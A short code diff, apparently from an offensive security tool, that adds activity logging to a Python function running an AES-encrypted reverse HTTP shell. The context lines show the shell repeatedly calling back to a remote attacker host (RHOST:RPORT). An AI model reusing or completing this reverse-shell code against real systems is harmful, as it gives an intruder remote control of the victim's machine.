@@ -23,6 +23,9 @@ def aeshttp():
 
     cipher = AES.new(secret)
 
+    if Logging == "yes":
+        write2file(ActivityLog, "\n\n [ Reverse AES HTTP shell executed ] ")
+
     while 1:
 
         req = urllib2.Request('http://%s:%s' % (RHOST,RPORT))
